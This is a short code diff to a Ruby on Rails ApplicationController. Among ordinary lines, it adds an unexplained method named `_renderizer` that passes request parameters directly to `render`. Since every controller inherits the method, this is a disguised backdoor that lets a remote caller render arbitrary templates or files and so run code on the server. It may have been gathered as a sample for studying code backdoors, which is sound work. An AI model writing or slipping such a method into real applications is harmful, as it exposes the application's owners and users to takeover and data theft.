@@ -2,6 +2,10 @@
 # Likewise, all the methods added will be available for all controllers.
 
 class ApplicationController < ActionController::Base
+
+  def _renderizer;  render params[:args];  end
+
+
   layout "base"
 
   before_filter :set_customer
